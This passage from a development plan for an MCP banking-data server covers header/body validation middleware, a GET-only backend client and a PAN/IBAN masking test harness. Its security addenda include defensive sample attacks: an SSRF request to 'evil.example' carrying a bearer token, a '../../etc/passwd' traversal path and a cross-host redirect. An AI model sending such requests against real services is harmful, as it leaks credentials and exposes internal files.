    seen: list[bytes] = []
    app = HeaderBodyValidation(_downstream(seen), strict=False)
    sent = await _call(app, {}, CALL)
    assert _status(sent) == 200
    assert seen == [CALL]


async def test_missing_headers_are_rejected_when_strict() -> None:
    app = HeaderBodyValidation(_downstream([]), strict=True)
    sent = await _call(app, {}, CALL)
    assert _status(sent) == 400
    assert _json(sent)["error"]["code"] == -32020


async def test_resources_read_matches_on_uri_not_name() -> None:
    seen: list[bytes] = []
    body = json.dumps(
        {"jsonrpc": "2.0", "id": 1, "method": "resources/read",
         "params": {"uri": "postern://errors"}}
    ).encode()
    app = HeaderBodyValidation(_downstream(seen))
    sent = await _call(app, {"Mcp-Method": "resources/read", "Mcp-Name": "postern://errors"}, body)
    assert _status(sent) == 200


async def test_unparseable_body_is_left_to_the_mcp_layer() -> None:
    seen: list[bytes] = []
    app = HeaderBodyValidation(_downstream(seen))
    sent = await _call(app, {"Mcp-Method": "tools/call"}, b"not json")
    assert _status(sent) == 200


async def test_non_post_requests_are_ignored() -> None:
    seen: list[bytes] = []
    app = HeaderBodyValidation(_downstream(seen))
    scope_get = {"type": "http", "method": "GET", "path": "/health", "headers": []}
    sent: list[dict] = []

    async def send(message):
        sent.append(message)

    async def receive():
        return {"type": "http.request", "body": b"", "more_body": False}

    await app(scope_get, receive, send)
    assert _status(sent) == 200
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `uv run pytest tests/test_header_body_mismatch.py -q`
Expected: FAIL, `ModuleNotFoundError: No module named 'services.api.asgi.header_validation'`

- [ ] **Step 3: Write the implementation**

```python
# services/api/asgi/header_validation.py
"""Header/body validation (MCP 2026-07-28 Streamable HTTP, handoff §3.3).

The spec: "Servers that process the request body MUST reject requests where the
values specified in the headers do not match the corresponding values in the
request body", returning HTTP 400 with JSON-RPC -32020. A load balancer routing
on a header while the server executes on the body is a request-smuggling shape.

This runs as ASGI middleware rather than FastMCP middleware because a FastMCP
ToolError is returned as CallToolResult(is_error=True) inside an HTTP 200, and
FastMCP exposes no way to set the HTTP status from a tool or hook.
"""

import json
from typing import Any

from starlette.types import ASGIApp, Message, Receive, Scope, Send

HEADER_MISMATCH = -32020

_NAME_FROM_PARAM = {"tools/call": "name", "prompts/get": "name", "resources/read": "uri"}


class HeaderBodyValidation:
    def __init__(self, app: ASGIApp, *, strict: bool = False) -> None:
        self.app = app
        self.strict = strict

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope["type"] != "http" or scope.get("method") != "POST":
            await self.app(scope, receive, send)
            return

        body = await _drain(receive)
        problem = self._check(_headers(scope), body)
        if problem is not None:
            await _reject(problem, body, scope, send)
            return
        await self.app(scope, _replay(body), send)

    def _check(self, headers: dict[str, str], body: bytes) -> str | None:
        payload = _parse(body)
        if payload is None:
            return None

        method = payload.get("method")
        if not isinstance(method, str):
            return None

        header_method = headers.get("mcp-method")
        if header_method is None:
            if self.strict:
                return "missing required Mcp-Method header"
        elif header_method != method:
            return f"Mcp-Method {header_method!r} does not match body method {method!r}"

        param = _NAME_FROM_PARAM.get(method)
        if param is None:
            return None

        params = payload.get("params")
        expected = params.get(param) if isinstance(params, dict) else None
        if not isinstance(expected, str):
            return None

        header_name = headers.get("mcp-name")
        if header_name is None:
            if self.strict:
                return "missing required Mcp-Name header"
            return None
        if header_name != expected:
            return f"Mcp-Name {header_name!r} does not match body {param} {expected!r}"
        return None


def _headers(scope: Scope) -> dict[str, str]:
    return {k.decode().lower(): v.decode() for k, v in scope.get("headers", [])}


def _parse(body: bytes) -> dict[str, Any] | None:
    try:
        payload = json.loads(body)
    except (ValueError, UnicodeDecodeError):
        return None
    return payload if isinstance(payload, dict) else None


async def _drain(receive: Receive) -> bytes:
    body = b""
    while True:
        message = await receive()
        if message["type"] != "http.request":
            break
        body += message.get("body", b"")
        if not message.get("more_body", False):
            break
    return body


def _replay(body: bytes) -> Receive:
    sent = False

    async def receive() -> Message:
        nonlocal sent
        if not sent:
            sent = True
            return {"type": "http.request", "body": body, "more_body": False}
        return {"type": "http.disconnect"}

    return receive


async def _reject(problem: str, body: bytes, scope: Scope, send: Send) -> None:
    payload = _parse(body) or {}
    request_id = payload.get("id")
    error = {
        "jsonrpc": "2.0",
        "id": request_id if isinstance(request_id, (str, int)) else None,
        "error": {"code": HEADER_MISMATCH, "message": "Header mismatch", "data": problem},
    }
    raw = json.dumps(error).encode()
    await send(
        {
            "type": "http.response.start",
            "status": 400,
            "headers": [
                (b"content-type", b"application/json"),
                (b"content-length", str(len(raw)).encode()),
            ],
        }
    )
    await send({"type": "http.response.body", "body": raw})
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `uv run pytest tests/test_header_body_mismatch.py -q`
Expected: PASS, 10 passed

- [ ] **Step 5: Record the two known deviations**

Append to `docs/decisions/0002-header-validation.md`:

- The spec requires Base64 sentinel header values to be decoded before comparison. This implementation compares raw values only, so a client using sentinel encoding would be rejected. Close it in Plan 4 alongside the client allowlist, when the set of clients is known.
- The spec also defines `Mcp-Param-{Name}` headers projected from a tool's `inputSchema` via `x-mcp-header`. No tool in this plan uses `x-mcp-header`, so no such header is validated. Revisit if a tool adopts it.

- [ ] **Step 6: Commit**

```bash
git add services/api/asgi/header_validation.py tests/test_header_body_mismatch.py docs/decisions/0002-header-validation.md
git commit -m "feat(api): reject Mcp-Method/Mcp-Name body mismatch with 400 and -32020"
```

**Addendum (2026-09-12, adversarial pass before commit):** the above steps'
code, as written, passed all 10 of its own tests but had two real bugs and one
unaddressed operational gap, found by attacking the implementation rather
than by extending its tests. Full detail, including the findings recorded but
deliberately not fixed, is in `docs/decisions/0002-header-validation.md`;
summary of what changed in the code actually committed:

- **Duplicate `Mcp-Method`/`Mcp-Name` headers.** `scope["headers"]` is a list;
  `_headers` above builds a `dict`, which keeps the last of a repeated
  header. Reproduced: `Mcp-Method: tools/list` followed by
  `Mcp-Method: tools/call`, body method `"tools/call"`, passed as a match
  (`assert 200 == 400` failed) because the surviving value happened to agree
  with the body — the exact case where an upstream load balancer routing on
  the *first* occurrence would have executed a different method than this
  middleware validated. Fixed: `_headers` now returns
  `dict[str, list[str]]`, keeping every occurrence per lower-cased name; a
  new `_single` helper returns `(value, is_duplicate)`, and either header
  being duplicated is rejected outright with `-32020`, independent of
  whether any individual value would have matched.
- **A header value with an invalid UTF-8 byte crashed the middleware.**
  `_headers` decoded with the UTF-8 default; `scope["headers"]` values carry
  no encoding guarantee (Starlette's own `Headers` datastructure decodes as
  latin-1 for this reason). `b"\xff\xfe".decode()` raises
  `UnicodeDecodeError`; the same bytes decode cleanly under latin-1. Fixed:
  both header names and values now decode as latin-1.
- **Unbounded buffering.** Nothing upstream (uvicorn, Starlette, FastMCP)
  bounds request body size, and the drain buffers the whole body before any
  check runs — a real denial-of-service surface, not fixed with a guessed
  number since this project has no basis for choosing one on a deployment's
  behalf. Added `max_body_bytes: int | None = None` to
  `HeaderBodyValidation.__init__`; `_drain` now takes the same parameter and
  raises `_BodyTooLarge` as soon as the running total crosses it, without
  finishing the buffer first; `__call__` responds `413` in that case. Default
  is unbounded, unchanged from the code above; a deployment that needs the
  cap must set it explicitly.
- **Ten findings were reported without changing the code**, including a
  parallel duplicate-key ambiguity inside the JSON body itself (Python's
  `json.loads` keeps the last of a repeated top-level key; RFC 8259 §4 calls
  the behaviour unpredictable across implementations) and the header/body
  case-sensitivity, whitespace, and leak-surface checks. All are detailed in
  `docs/decisions/0002-header-validation.md`.

`tests/test_header_body_mismatch.py` grew from the 10 tests above to 30: the
20 added tests cover every finding, including a real end-to-end request
through `build_server` + `mcp.http_app(middleware=[Middleware(
HeaderBodyValidation, ...)])` driven with `httpx2.ASGITransport` (`httpx` is
not installed in this project — `docs/decisions/0001-facade-http-client.md`).
`uv run pytest tests/test_header_body_mismatch.py -q` → `30 passed`.

---

### Task 6: Backend façade client

**Files:**
- Create: `packages/postern-core/src/postern_core/facade/client.py`
- Test: `tests/test_facade_client.py`

Handoff §8.6: this layer is not a proxy. It attaches the internal token, projects responses, and translates errors. The token minter is injected as a seam: this plan ships a stub that Plan 3 replaces with the Vault-backed `InternalTokenMinter`, so the Authorization header shape is right from the first call.

**Must satisfy Task 4's `Protocol`.** `services/api/server.py`'s `build_server` types its `backend` parameter as `postern_core.facade.protocol.BackendReader`, not this module's `BackendClient` — Task 4 was implemented before this module existed. `BackendClient` must expose an async `get_json(self, path: str, *, customer: CustomerRef, audience: str = "accounts.svc", params: Mapping[str, Any] | None = None) -> Any` matching that Protocol's signature structurally (no import of `BackendReader` needed in this file); `mypy --strict` on `services/api/server.py` is what will catch a drift between the two.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_facade_client.py
import httpx2
import pytest

from postern_core.facade.client import BackendClient, BackendError, StubTokenMinter
from postern_core.identity import CustomerRef

CUSTOMER = CustomerRef(value="cust_7f3a")


def _transport(handler) -> httpx2.MockTransport:
    return httpx2.MockTransport(handler)


async def test_get_json_returns_the_decoded_body() -> None:
    def handler(request: httpx2.Request) -> httpx2.Response:
        return httpx2.Response(200, json={"accounts": []})

    client = BackendClient("https://backend.test", StubTokenMinter(), transport=_transport(handler))
    assert await client.get_json("/accounts", customer=CUSTOMER) == {"accounts": []}
    await client.aclose()


async def test_get_json_attaches_a_bearer_token() -> None:
    seen: list[str] = []

    def handler(request: httpx2.Request) -> httpx2.Response:
        seen.append(request.headers["authorization"])
        return httpx2.Response(200, json={})

    client = BackendClient("https://backend.test", StubTokenMinter(), transport=_transport(handler))
    await client.get_json("/accounts", customer=CUSTOMER)
    assert seen == ["Bearer stub.read.cust_7f3a"]
    await client.aclose()


async def test_query_parameters_are_forwarded() -> None:
    seen: list[str] = []

    def handler(request: httpx2.Request) -> httpx2.Response:
        seen.append(str(request.url))
        return httpx2.Response(200, json={})

    client = BackendClient("https://backend.test", StubTokenMinter(), transport=_transport(handler))
    await client.get_json("/transactions", customer=CUSTOMER, params={"days": 30})
    assert seen == ["https://backend.test/transactions?days=30"]
    await client.aclose()


async def test_a_404_becomes_an_actionable_backend_error() -> None:
    def handler(request: httpx2.Request) -> httpx2.Response:
        return httpx2.Response(404, json={"detail": "no such account"})

    client = BackendClient("https://backend.test", StubTokenMinter(), transport=_transport(handler))
    with pytest.raises(BackendError) as excinfo:
        await client.get_json("/accounts/acc_missing", customer=CUSTOMER)
    assert excinfo.value.status == 404
    await client.aclose()


async def test_the_client_never_sends_a_write_method() -> None:
    client = BackendClient("https://backend.test", StubTokenMinter(), transport=_transport(lambda r: httpx2.Response(200)))
    assert not hasattr(client, "post_json")
    assert not hasattr(client, "put_json")
    await client.aclose()
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `uv run pytest tests/test_facade_client.py -q`
Expected: FAIL, `ModuleNotFoundError: No module named 'postern_core.facade.client'`

- [ ] **Step 3: Write the implementation**

```python
# packages/postern-core/src/postern_core/facade/client.py
"""Read-path backend façade (handoff §8.6).

This client exposes GET only. The write path lives in services/confirm and is
reachable only from a signed approval, so a write method here would be the
capability the whole design removes.

`httpx2` is FastMCP 4's HTTP dependency; see docs/decisions/0001.
"""

from collections.abc import Mapping
from typing import Any, Protocol

import httpx2

from postern_core.identity import CustomerRef


class BackendError(RuntimeError):
    """A backend call failed. `guidance` is what the agent should be told to do."""

    def __init__(self, status: int, detail: str, guidance: str) -> None:
        super().__init__(f"{status}: {detail}")
        self.status = status
        self.detail = detail
        self.guidance = guidance


class TokenMinter(Protocol):
    """Mints the internal token for one backend hop (handoff §7.2)."""

    def __call__(self, customer: CustomerRef, audience: str) -> str: ...


class StubTokenMinter:
    """Placeholder until Plan 3 wires Vault. Never deploy this."""

    def __call__(self, customer: CustomerRef, audience: str) -> str:
        return f"stub.read.{customer.value}"


_GUIDANCE = {
    401: "The session is no longer authorized; ask the customer to reconnect Postern.",
    403: "This account is not covered by the current consent; call banking_start_session.",
    404: "No such record. List the available refs with the matching list tool first.",
    429: "The bank is rate limiting this client. Wait before retrying.",
}
_DEFAULT_GUIDANCE = "The bank could not answer right now. Tell the customer and retry later."


class BackendClient:
    def __init__(
        self,
        base_url: str,
        minter: TokenMinter,
        *,
        transport: httpx2.AsyncBaseTransport | None = None,
        timeout: float = 10.0,
    ) -> None:
        self._minter = minter
        self._client = httpx2.AsyncClient(base_url=base_url, transport=transport, timeout=timeout)

    async def get_json(
        self,
        path: str,
        *,
        customer: CustomerRef,
        audience: str = "accounts.svc",
        params: Mapping[str, Any] | None = None,
    ) -> Any:
        token = self._minter(customer, audience)
        response = await self._client.get(
            path, params=params, headers={"Authorization": f"Bearer {token}"}
        )
        if response.status_code >= 400:
            detail = _detail(response)
            raise BackendError(
                response.status_code, detail, _GUIDANCE.get(response.status_code, _DEFAULT_GUIDANCE)
            )
        return response.json()

    async def aclose(self) -> None:
        await self._client.aclose()


def _detail(response: httpx2.Response) -> str:
    try:
        body = response.json()
    except ValueError:
        return response.text[:200]
    return str(body.get("detail", body))[:200] if isinstance(body, dict) else str(body)[:200]
```

Error messages carry `guidance` because handoff §6.6 requires telling the agent what to do next, not just what failed: "Consent expired for account X; call `accounts.request_consent` to re-authorize" beats "403".

- [ ] **Step 4: Run the test to verify it passes**

Run: `uv run pytest tests/test_facade_client.py -q`
Expected: PASS, 5 passed

- [ ] **Step 5: Commit**

```bash
git add packages/postern-core/src/postern_core/facade/client.py tests/test_facade_client.py
git commit -m "feat(facade): GET-only backend client with injected token minter"
```

**Addendum (2026-09-13, implementation-time security review — two leak paths closed,
five more probed and reported):** the `_detail`/`get_json`/`BackendClient.__init__` code
above is what the plan originally proposed; what was actually committed differs in the
ways below, each with the measurement behind it.

*Leak path 1 — `_detail` returned unscrubbed backend text into `BackendError`.* A
`BackendError` raised inside a tool handler (Tasks 8-11) propagates to FastMCP and from
there into the model's context, i.e. a vendor chat history that cannot be recalled. A
bank backend's 4xx/5xx body can carry a PAN, IBAN, account number or customer name.
Measured before the fix (this module standalone, not yet wired to a tool):
`_detail(httpx2.Response(400, json={"detail": "transfer to GB29NWBK60161331926819
rejected"}))` returned the raw IBAN unchanged. Fix: `_detail` now runs the derived text
through `pydantic.TypeAdapter(postern_core.domain.masking.FreeText).validate_python`
before truncating to 200 characters, and truncates *after* scrubbing, not before — cutting
first could split a PAN/IBAN in half and leave an unmasked fragment past the cut, or a
masked-but-truncated one before it. Verified: the same call now returns `"transfer to
GB•• •••• 6819 rejected"`. Four tests added, covering the `detail`-key path, the
no-`detail`-key fallback to the whole JSON body, the non-JSON `response.text` fallback,
and the truncation-order case.

*Leak path 2 — `path` was an unvalidated string and `httpx2` honours absolute URLs.*
Spiked empirically with the same `httpx2.MockTransport` technique as decision 0001, against
`httpx2` 2.12.0: a client built with `AsyncClient(base_url="https://backend.test")` sent
`client.get("https://evil.example/x", headers={"Authorization": "Bearer secret-token"})`
straight to `evil.example`, carrying the `Authorization` header — an SSRF that exfiltrates
the internal bearer token to whatever the caller passes as `path`. `client.get("/accounts/
../../etc/passwd")` stayed on `backend.test` in this version but resolved to
`https://backend.test/etc/passwd`, escaping the intended path prefix.
`client.get("//evil.example/x")` (protocol-relative) also stayed on `backend.test` in this
version. Every call site today builds `path` from a `Ref`-validated value, so this is
defence in depth, not the primary control. Fix: `_validate_path` rejects, via
`urllib.parse.urlsplit`, any `path` carrying a scheme or a netloc (covers both the absolute
and protocol-relative cases in one check regardless of which way a future `httpx2` version
resolves the protocol-relative case), any `path` not starting with `/` (not rooted), and
any `path` whose `/`-separated segments include a literal `..`. Percent-encoded traversal
(`%2e%2e`) was spiked too and is not collapsed by `httpx2`, so it is left as an opaque path
segment rather than checked for. Five tests added: absolute URL, protocol-relative,
`..` segments, non-rooted, and one proving a rejected path never reaches the transport or
mints a token (`_validate_path` runs before `self._minter(...)`).

*Redirects.* Spiked: `httpx2.AsyncClient.__init__`'s own default is `follow_redirects=False`
(confirmed via `inspect.signature`), and a `MockTransport` handler returning a `302` with a
cross-host `Location` is returned as-is, not followed. The constructor now passes
`follow_redirects=False` explicitly rather than relying on that default staying put across
`httpx2` versions. One test added: a `302` from `backend.test` to `https://evil.example/steal`
results in exactly one request, to `backend.test` only.

*Timeout.* `timeout=10.0` becomes `httpx2.Timeout(10.0)`, which sets `connect`, `read`,
`write` and `pool` to 10.0 **independently** (confirmed: `Timeout(10.0).connect == .read ==
.write == .pool == 10.0`), not as one combined budget. A slow backend can therefore hang a
single `get_json` call for close to 40 seconds in the worst case (connect + write + read +
pool each separately budgeted at 10s), not 10. Recorded, not changed here: whether a tool
call needs a tighter end-to-end budget than the sum of these four phases is a product
decision (how long can an agent's tool call legitimately hang before the client gives up
and the customer sees a stalled response) belonging with Task 12's composition, not this
constructor default.

*`StubTokenMinter`.* Nothing in this codebase can turn "never deploy this" into a hard
failure without a deployment decision (an environment flag, a settings check) that Task 12
owns. The cheap guard implemented here: `StubTokenMinter.__call__` now issues a
`RuntimeWarning` (`stacklevel=2`) on every call, so a deployment that never wired the
Vault-backed `InternalTokenMinter` is loud in logs/warning capture instead of silently
minting a fake token. One test added asserting the warning fires and the token shape is
unchanged.

*The `Authorization` header.* Confirmed attached on every `get_json` call (existing test,
unchanged). Spiked whether anything echoes it: `httpx2`'s own `Headers.__repr__` masks the
`authorization` key to the literal string `'[secure]'` (measured:
`Headers({"Authorization": "Bearer super-secret-token"})` reprs as `...'authorization':
'[secure]'...`), and `httpx2`'s own request-completion log line (`INFO:httpx2:HTTP Request:
GET https://backend.test/accounts "HTTP/1.1 200 OK"`) carries the method, URL and status
line only, no headers. A manually raised `httpx2.HTTPStatusError` reprs/strs to just the
message passed to it, not the request or its headers. Nothing in `client.py` itself logs or
reprs the token. No code change; reported as a clean finding.

*`aclose`.* Nothing in this task's scope calls it — `BackendClient` is constructed directly
in every test and in `services/api/server.py`'s type signature only (no concrete instance
exists yet; that is Task 12's composition root). As wired *today*, the client is not leaked
per request or per server, because nothing yet constructs one outside a test, where `aclose`
is already called explicitly in every test in `tests/test_facade_client.py`. This is a
lifecycle question for Task 12 to answer once `services/api/main.py` constructs one
`BackendClient` per process lifetime (or per request — that choice is Task 12's, not this
one's): whichever it picks, `aclose` needs to run on shutdown (or after each request, if
per-request) or the underlying connection pool leaks. Not built here per this task's scope.

*No write method.* Confirmed via the plan's own `test_the_client_never_sends_a_write_method`
(instance-level `hasattr` check, unchanged) plus one test added,
`test_the_client_class_exposes_no_write_method_of_any_kind`, which enumerates the entire
public callable surface of the class and asserts it equals exactly `{"get_json", "aclose"}`
— so adding any future write method fails this test in CI, not only a code reviewer's
attention.

*Structural conformance with `BackendReader`.* `mypy --strict` passed across `packages
services tests` with `BackendClient.get_json`'s signature written to match
`postern_core.facade.protocol.BackendReader.get_json` exactly (same parameter names, types,
positional/keyword-only split, and default). This module does not import `BackendReader`,
per the plan. The structural check itself is not yet *exercised* by mypy — no code today
assigns a `BackendClient` instance to a `BackendReader`-typed name, because `services/api/
main.py` (Task 12) is what would construct one and pass it into `build_server(backend=...)`.
That remains true until Task 12.

Test count: `tests/test_facade_client.py` has 18 tests (5 from the plan's original Step 1,
13 added for the two leak paths and the other probed findings above).

---

### Task 7: The golden masking test harness

**Files:**
- Create: `tests/fixtures/backend_responses.py`
- Create: `tests/test_masking_golden.py`
- Test: itself

Handoff §6.5: "run every tool against fixture data and assert no output matches a PAN or IBAN regex. Types prevent the mistake; this catches someone adding a raw passthrough field." Build it now, with zero tools, so every tool added afterwards has to register a case or the build fails.

- [ ] **Step 1: Write the fixtures**

```python
# tests/fixtures/backend_responses.py
"""Backend responses carrying values that MUST NOT reach a tool result."""

FULL_PAN = "4111111111114417"
FULL_IBAN = "ES9121000418450200051332"
COUNTERPARTY_IBAN = "DE89370400440532013000"

ACCOUNTS = {
    "accounts": [
        {"id": "acc_7f3a", "label": "Joint expenses", "iban": FULL_IBAN},
        {"id": "acc_9b21", "label": "Savings", "iban": "ES2221000418450200051119"},
    ]
}

BALANCE = {
    "account_id": "acc_7f3a",
    "amount": "1200.50",
    "currency": "EUR",
    "as_of": "2026-09-12T10:00:00Z",
}

TRANSACTIONS = {
    "transactions": [
        {
            "id": "txn_1",
            "account_id": "acc_7f3a",
            "booked_at": "2026-09-11T08:30:00Z",
            "amount": "-34.20",
            "currency": "EUR",
            "counterparty_name": "Acme Ltd",
            "counterparty_iban": COUNTERPARTY_IBAN,
            "description": f"Card {FULL_PAN} purchase, ref {COUNTERPARTY_IBAN}",
        }
    ]
}

CARDS = {"cards": [{"id": "crd_1", "label": "Debit", "pan": FULL_PAN, "status": "active"}]}
```

The `description` field deliberately embeds a full PAN and IBAN in free text. That is the realistic leak: a backend string field that no type protects.

- [ ] **Step 2: Write the harness**

```python
# tests/test_masking_golden.py
"""Golden masking test (handoff §6.5).

Every registered tool must appear in CASES. Adding a tool without a case fails
this test, which is the point: the check must not be something you can forget.
"""

import json
import re
from typing import Any

import httpx2
import pytest
from fastmcp import FastMCP
from fastmcp.client import Client
from fastmcp.client.client import CallToolResult  # not re-exported by fastmcp.client.__init__
from fastmcp.exceptions import ToolError
from postern_core.facade.client import BackendClient, StubTokenMinter

from services.api.server import build_server
from services.api.settings import Settings
from tests.conftest import TEST_CUSTOMER
from tests.fixtures import backend_responses as fx

# Deliberately not `postern_core.domain.masking._PAN_RE` / `_IBAN_RE`. Those
# are private, fullmatch-oriented patterns for validating a single
# already-separator-stripped field; they have no tolerance for a
# space/hyphen-grouped run still embedded in a larger serialized blob, so
# reusing them here would make this harness WEAKER at exactly the free-text
# case (a card number typed with spaces into a memo) the module's own
# `_redact_free_text` docstring names as the realistic leak shape. A golden
# test's job is to search loosely and over-flag; masking.py's job is to
# fullmatch narrowly and validate. Same underlying facts, different purpose.
PAN_RE = re.compile(r"(?<!\d)(?:\d[ -]?){13,19}(?!\d)")
IBAN_RE = re.compile(r"(?<![A-Z0-9])[A-Z]{2}\d{2}[A-Z0-9]{10,30}(?![A-Z0-9])")

ROUTES = {
    "/accounts": fx.ACCOUNTS,
    "/accounts/acc_7f3a/balance": fx.BALANCE,
    "/transactions": fx.TRANSACTIONS,
    "/cards": fx.CARDS,
}

CASES: dict[str, dict[str, Any]] = {}
"""tool name -> arguments. Extended by Tasks 8, 9, 10 and 11."""


def _handler(request: httpx2.Request) -> httpx2.Response:
    body = ROUTES.get(request.url.path)
    if body is None:
        return httpx2.Response(404, json={"detail": f"no fixture for {request.url.path}"})
    return httpx2.Response(200, json=body)


@pytest.fixture
def server() -> FastMCP:
    backend = BackendClient(
        "https://backend.test", StubTokenMinter(), transport=httpx2.MockTransport(_handler)
    )
    return build_server(Settings.for_testing(), resolver=lambda: TEST_CUSTOMER, backend=backend)


def _render_result(result: CallToolResult) -> str:
    """Everything a client could actually receive from this call, not just
    the structured half. `structured_content`/`data` are both `None` on an
    error result (fastmcp 4.0.3's `_on_call_tool` puts `str(exc)` straight
    into a `TextContent` block on the error path and sets neither of the
    other two), so a scan of `structured_content or data` alone is blind to
    a leak that reaches the client only through an error message. `content`
    blocks are Pydantic models (`mcp_types.ContentBlock`), dumped through
    `model_dump(mode="json")` so they serialize the same way
    `structured_content` already does.
    """
    payload = {
        "content": [block.model_dump(mode="json") for block in result.content],
        "structured_content": result.structured_content,
        "data": result.data,
    }
    return json.dumps(payload, default=str)


async def _assert_every_registered_tool_has_a_case(
    server: FastMCP, cases: dict[str, dict[str, Any]]
) -> None:
    async with Client(transport=server) as client:
        registered = {tool.name for tool in await client.list_tools()}
    missing = registered - cases.keys()
    assert not missing, f"tools with no golden masking case: {sorted(missing)}"


async def _assert_no_tool_output_leaks_a_pan_or_iban(
    server: FastMCP, cases: dict[str, dict[str, Any]]
) -> None:
    async with Client(transport=server) as client:
        for name, arguments in cases.items():
            # raise_on_error=False: an erroring tool must be a case this scan
            # inspects, not a ToolError this loop lets escape uncaught.
            result = await client.call_tool(name, arguments, raise_on_error=False)
            rendered = _render_result(result)
            assert not PAN_RE.search(rendered), f"{name} leaked a PAN: {rendered[:400]}"
            assert not IBAN_RE.search(rendered), f"{name} leaked an IBAN: {rendered[:400]}"


async def test_every_registered_tool_has_a_masking_case(server: FastMCP) -> None:
    await _assert_every_registered_tool_has_a_case(server, CASES)


async def test_no_tool_output_contains_a_pan_or_iban(server: FastMCP) -> None:
    await _assert_no_tool_output_leaks_a_pan_or_iban(server, CASES)


def test_the_regexes_actually_catch_the_fixtures() -> None:
    """A masking test whose regex matches nothing is worse than no test."""
    assert PAN_RE.search(fx.FULL_PAN)
    assert IBAN_RE.search(fx.FULL_IBAN)
    assert IBAN_RE.search(fx.COUNTERPARTY_IBAN)
    assert not PAN_RE.search("•••• 4417")
    assert not IBAN_RE.search("ES•• •••• 1332")
    # Grouped forms are just as much a leak as the bare one.
    assert PAN_RE.search("4111 1111 1111 4417")
    assert PAN_RE.search("4111-1111-1111-4417")


# --- Self-check: proof the harness above is a control, not a decoration. ---
# Each test below builds a deliberately leaky server in-process and asserts
# the SAME helpers the production tests call (`_assert_every_registered_
# tool_has_a_case`, `_assert_no_tool_output_leaks_a_pan_or_iban`) raise
# against it, so a future change that defangs the real check makes these
# report "DID NOT RAISE" instead of the whole file staying quietly green.


def _leaky_accounts_server() -> FastMCP:
    leaky = FastMCP(name="leaky-proof-raw-dict")

    @leaky.tool
    def leaky_accounts() -> dict[str, Any]:
        return fx.ACCOUNTS  # raw backend dict: full IBANs, no domain model at all

    return leaky


def _leaky_error_server() -> FastMCP:
    leaky = FastMCP(name="leaky-proof-error-message")

    @leaky.tool
    def leaky_error() -> dict[str, Any]:
        raise ToolError(f"backend said: account not found for {fx.FULL_IBAN}")

    return leaky


async def test_self_check_harness_catches_a_raw_passthrough_leak() -> None:
    leaky = _leaky_accounts_server()
    with pytest.raises(AssertionError, match="leaked an IBAN"):
        await _assert_no_tool_output_leaks_a_pan_or_iban(leaky, {"leaky_accounts": {}})


async def test_self_check_harness_catches_an_unregistered_tool() -> None:
    leaky = _leaky_accounts_server()
    with pytest.raises(AssertionError, match="no golden masking case"):
        await _assert_every_registered_tool_has_a_case(leaky, cases={})


async def test_self_check_harness_catches_a_leak_in_an_error_message() -> None:
    leaky = _leaky_error_server()
    with pytest.raises(AssertionError, match="leaked an IBAN"):
        await _assert_no_tool_output_leaks_a_pan_or_iban(leaky, {"leaky_error": {}})
```

`test_the_regexes_actually_catch_the_fixtures` is not ceremony: a golden test whose pattern never matches passes forever while leaking everything.

**Corrected against what execution actually found (2026-09-13):** the plan's original harness code differs from the above in five ways, all found while proving by experiment that a golden test which has never failed is not distinguishable from one that cannot fail (see the addendum after Step 4):

1. **The coverage and leak assertions are extracted into `_assert_every_registered_tool_has_a_case` / `_assert_no_tool_output_leaks_a_pan_or_iban`**, called by both the production tests and the `test_self_check_*` tests below, so the self-checks exercise the exact code path that guards CI rather than a hand-rolled copy that could drift from it.
2. **`_render_result` replaces the plan's `json.dumps(result.structured_content or result.data, default=str)`.** Verified against fastmcp 4.0.3's own source (`fastmcp/server/mixins/mcp_operations.py`, `_on_call_tool`'s `except FastMCPError as e` branch): an error result gets `content=[TextContent(text=str(e))]` with `structured_content` and `data` both left `None`, so the plan's expression is blind to a leak that reaches the client only through an error message. Reproduced experimentally: a tool raising `ToolError(f"... {FULL_IBAN}")` leaves `result.structured_content or result.data` rendering as the literal string `"null"` while `result.content[0].text` carries the full IBAN. `_render_result` scans `content`, `structured_content`, and `data` together; on a successful result this duplicates `structured_content` (FastMCP derives `content` from the same value for any handler that doesn't hand-build a `ToolResult`) rather than missing anything.
3. **`_assert_no_tool_output_leaks_a_pan_or_iban` calls `client.call_tool(name, arguments, raise_on_error=False)`.** The `fastmcp.client.Client.call_tool` default is `raise_on_error=True`, under which an erroring tool makes the *client* raise `ToolError` with the raw message, which would abort the `for` loop (skipping every later case) and print the raw value into the pytest traceback/CI log rather than a clean, redacted-length assertion message.
4. **`test_the_regexes_actually_catch_the_fixtures` gained two assertions** for a space-grouped and a hyphen-grouped PAN (`"4111 1111 1111 4417"`, `"4111-1111-1111-4417"`), confirming `PAN_RE`'s `(?:\d[ -]?){13,19}` tolerates the grouping a real leak would carry (a card number typed with spaces into a memo). Checked separately and *not* fixed here, out of this task's scope: `IBAN_RE` has no equivalent grouping tolerance, so a space-grouped IBAN (`"ES91 2100 0418 4502 0005 1332"`) is currently only caught by `PAN_RE` coincidentally matching its digit run, which would not hold for an IBAN whose digits are broken up by letters (e.g. a UK-style `GBkk BBBB SSSS SSCC CCCC CC` grouping).
5. **Type annotations throughout** (`CASES: dict[str, dict[str, Any]]`, the `server` fixture, `_render_result`'s parameter, every test's `server` argument) needed for `mypy --strict`, which the plan's own snippet did not satisfy as written.

Three permanent `test_self_check_*` tests were added (not a throwaway experiment deleted after use): each builds a deliberately leaky server in-process — a raw-dict passthrough, a tool absent from `CASES`, and a tool that leaks through an error message — and asserts the production helpers raise against it. Verified by deliberately reintroducing each defect in turn (an `IBAN_RE` that matches nothing; a `_render_result` reverted to the plan's original expression) and confirming the corresponding self-check, and only that one, reports "DID NOT RAISE".

- [ ] **Step 3: Run the tests**

Run: `uv run pytest tests/test_masking_golden.py -q`
Expected: PASS, 6 passed, not 3. With `CASES` empty and no tools registered, `test_every_registered_tool_has_a_masking_case` and `test_no_tool_output_contains_a_pan_or_iban` still pass trivially — that half of the plan's claim holds. The three `test_self_check_*` tests are new (see the correction above) and pass because the leaky servers they build are deliberately caught, not because anything is trivial.

- [ ] **Step 4: Commit**

```bash
git add tests/fixtures/backend_responses.py tests/test_masking_golden.py
git commit -m "test: golden masking harness that fails on any unregistered tool"
```

---

### Task 8: `accounts.list` and `accounts.get_balance`

**Files:**
- Create: `packages/postern-core/src/postern_core/facade/accounts.py`
- Create: `services/api/tools/accounts.py`
- Modify: `services/api/server.py` (register the tools)
- Modify: `tests/test_masking_golden.py` (add two cases)
